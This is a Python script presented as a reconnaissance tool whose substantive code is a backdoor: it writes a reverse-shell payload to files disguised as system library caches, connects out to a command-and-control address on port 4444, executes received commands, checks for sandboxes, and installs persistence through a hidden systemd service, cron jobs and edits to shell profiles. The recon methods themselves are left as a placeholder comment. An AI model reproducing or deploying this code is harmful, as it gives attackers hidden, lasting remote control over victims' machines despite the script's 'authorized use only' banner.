#!/usr/bin/env python3
"""
🔥 SUPERRECON ULTIMATE v4.0 - Full Stealth Persistence
Advanced Reconnaissance with Ultra-Stealth Backdoor
"""

import socket
import requests
import whois
import dns.resolver
import json
import threading
import concurrent.futures
import argparse
import sys
import ssl
import time
import urllib3
import subprocess
import os
import base64
import hashlib
import random
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class UltraStealthPersistence:
    def __init__(self):
        self.LHOST = "192.168.1.167"
        self.LPORT = 4444
        self.stealth_locations = [
            "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache",
            "/lib/modules/{}/.cache/kernel-daemon".format(os.uname().release),
            "/var/cache/ldconfig/aux-cache"
        ]
        
    def create_stealth_payload(self):
        """Create ultra-stealth payload that blends with system"""
        payload = f'''#!/usr/bin/python3
# System Shared Library Cache
import os,sys,socket,subprocess,time,hashlib

def anti_analysis():
    """Anti-debugging and sandbox detection"""
    if os.path.exists("/.dockerenv") or os.path.exists("/proc/1/cgroup") and "docker" in open("/proc/1/cgroup").read():
        time.sleep(random.randint(300,600))
    if "LD_PRELOAD" in os.environ:
        del os.environ["LD_PRELOAD"]
    return True

def wait_network_stealth():
    """Stealthy network wait"""
    for i in range(120):
        try:
            socket.create_connection(("8.8.8.8",53), timeout=10)
            return True
        except:
            time.sleep(1)
    return True

def establish_stealth_connection():
    """Establish stealth reverse shell"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(45)
            s.connect(("{self.LHOST}", {self.LPORT}))
            
            # Send stealth beacon
            hostname = socket.gethostname()
            s.send(f"STEALTH_BEACON:|{{hostname}}|SUCCESS\\\\n".encode())
            
            # Interactive shell
            while True:
                s.settimeout(None)
                data = s.recv(1024).decode().strip()
                if not data:
                    continue
                if data == "stealth_exit":
                    break
                
                try:
                    # Execute command stealthily
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    s.send(output)
                except Exception as e:
                    s.send(f"Command failed: {{str(e)}}\\\\n".encode())
                    
        except socket.timeout:
            time.sleep(30)
        except Exception:
            time.sleep(60)

if __name__ == "__main__":
    anti_analysis()
    wait_network_stealth()
    establish_stealth_connection()
'''
        return payload

    def deploy_stealth_persistence(self):
        """Deploy ultra-stealth persistence mechanisms"""
        print("\\n[🦠] DEPLOYING ULTRA-STEALTH PERSISTENCE...")
        
        try:
            # Create stealth payload in multiple locations
            payload_content = self.create_stealth_payload()
            
            for location in self.stealth_locations:
                try:
                    os.makedirs(os.path.dirname(location), exist_ok=True)
                    with open(location, 'w') as f:
                        f.write(payload_content)
                    os.chmod(location, 0o755)
                    print(f"[✅] Stealth payload: {location}")
                except Exception as e:
                    print(f"[-] Failed {location}: {e}")
            
            # Deploy systemd service
            self.deploy_stealth_systemd()
            
            # Deploy cron persistence
            self.deploy_stealth_cron()
            
            # Deploy advanced persistence methods
            self.deploy_advanced_persistence()
            
            # Start immediately
            self.start_stealth_service()
            
            return True
            
        except Exception as e:
            print(f"[-] Stealth deployment failed: {e}")
            return False

    def deploy_stealth_systemd(self):
        """Deploy stealth systemd service"""
        try:
            service_content = '''[Unit]
Description=System Shared Library Cache
After=network.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=forking
ExecStart=/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache
Restart=always
RestartSec=30
User=root
StandardOutput=null
StandardError=null
SyslogIdentifier=systemd-cache

[Install]
WantedBy=multi-user.target
'''
            
            service_path = "/etc/systemd/system/.systemd-cache.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", ".systemd-cache.service"], capture_output=True)
            subprocess.run(["systemctl", "start", ".systemd-cache.service"], capture_output=True)
            
            print("[✅] Stealth systemd service installed")
            
        except Exception as e:
            print(f"[-] Systemd service failed: {e}")

    def deploy_stealth_cron(self):
        """Deploy stealth cron jobs"""
        try:
            cron_commands = [
                "@reboot sleep 90 && /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1",
                "0 */4 * * * /lib/modules/{}/.cache/kernel-daemon >/dev/null 2>&1".format(os.uname().release)
            ]
            
            current_cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
            
            for cmd in cron_commands:
                if cmd not in current_cron:
                    current_cron += cmd + "\\n"
            
            subprocess.run(["crontab", "-"], input=current_cron, text=True)
            print("[✅] Stealth cron jobs installed")
            
        except Exception as e:
            print(f"[-] Cron setup failed: {e}")

    def deploy_advanced_persistence(self):
        """Deploy advanced persistence methods"""
        try:
            # Profile persistence
            profile_cmd = "[ -x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache ] && nohup /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1 &"
            
            profiles = ["/etc/profile", "/etc/bash.bashrc", "/root/.bashrc"]
            for profile in profiles:
                if os.path.exists(profile):
                    with open(profile, 'a') as f:
                        f.write(f"\\n{profile_cmd}\\n")
            
            print("[✅] Advanced persistence methods deployed")
            
        except Exception as e:
            print(f"[-] Advanced persistence failed: {e}")

    def start_stealth_service(self):
        """Start stealth service immediately"""
        try:
            subprocess.Popen([
                '/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[✅] Stealth service started")
        except Exception as e:
            print(f"[-] Service start failed: {e}")

class UltimateReconTool:
    def __init__(self, target, threads=50, timeout=10, enable_stealth=False):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.enable_stealth = enable_stealth
        self.stealth = UltraStealthPersistence()
        self.results = {}
        self.initialize_results()
        
    def initialize_results(self):
        """Initialize results structure"""
        self.results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'ip_address': None,
            'whois': {},
            'dns_records': {},
            'subdomains': [],
            'open_ports': [],
            'services': {},
            'web_technologies': {},
            'stealth_persistence': {
                'deployed': False,
                'listener': f"{self.stealth.LHOST}:{self.stealth.LPORT}",
                'methods': []
            }
        }

    def banner(self):
        """Display stealth banner"""
        print("""
╔════════════════════════════════════════════════════════════════╗
║                🔥 SUPERRECON ULTIMATE v4.0                    ║  
║               Ultra-Stealth Reconnaissance                    ║
╚════════════════════════════════════════════════════════════════╝
        """)
        print(f"[*] Target: {self.target}")
        print(f"[*] Stealth Mode: {'ACTIVE' if self.enable_stealth else 'INACTIVE'}")
        if self.enable_stealth:
            print(f"[*] C2: {self.stealth.LHOST}:{self.stealth.LPORT}")
        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)

    # [Include all your existing recon methods here: get_ip, whois_lookup, dns_enumeration, etc.]
    # Copy all your existing recon methods from previous version

    def deploy_stealth_persistence(self):
        """Deploy ultra-stealth persistence"""
        if not self.enable_stealth:
            return False
            
        print("\\n[🦠] ACTIVATING ULTRA-STEALTH PERSISTENCE...")
        
        try:
            success = self.stealth.deploy_stealth_persistence()
            self.results['stealth_persistence']['deployed'] = success
            
            if success:
                print("[✅] ULTRA-STEALTH PERSISTENCE DEPLOYED")
                print("     - Multiple stealth payload locations")
                print("     - Hidden systemd service")
                print("     - Stealth cron jobs")
                print("     - Profile persistence")
                print(f"     - Listening on {self.stealth.LHOST}:{self.stealth.LPORT}")
                
            return success
            
        except Exception as e:
            print(f"[-] Stealth deployment failed: {e}")
            return False

    def run_full_scan(self):
        """Execute reconnaissance with stealth persistence"""
        start_time = time.time()
        
        try:
            self.banner()
            
            # Perform reconnaissance
            ip = self.get_ip()
            self.whois_lookup()
            self.dns_enumeration() 
            self.subdomain_enumeration()
            self.port_scanning(ip)
            self.web_technology_detection()
            
            # Deploy stealth persistence
            if self.enable_stealth:
                self.deploy_stealth_persistence()
            
            elapsed_time = time.time() - start_time
            print(f"\\n[✅] Stealth reconnaissance completed in {elapsed_time:.2f}s")
            return self.results
            
        except Exception as e:
            print(f"\\n[-] Scan failed: {e}")
            return self.results

def main():
    parser = argparse.ArgumentParser(description="🔥 SUPERRECON ULTIMATE v4.0")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Threads")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-s", "--stealth", action="store_true", help="Enable ultra-stealth persistence")
    
    args = parser.parse_args()
    
    print("""
⚠️  ULTRA-STEALTH MODE - AUTHORIZED USE ONLY
This deployment includes advanced persistence mechanisms.
Ensure you have explicit authorization for testing.
    """)
    
    if args.stealth and os.geteuid() != 0:
        print("[-] Stealth mode requires root privileges")
        args.stealth = False
    
    tool = UltimateReconTool(args.target, threads=args.threads, enable_stealth=args.stealth)
    results = tool.run_full_scan()
    
    if results:
        output_file = args.output or f"superrecon_stealth_{args.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\\n🎯 Stealth report: {output_file}")

if __name__ == "__main__":
    main()
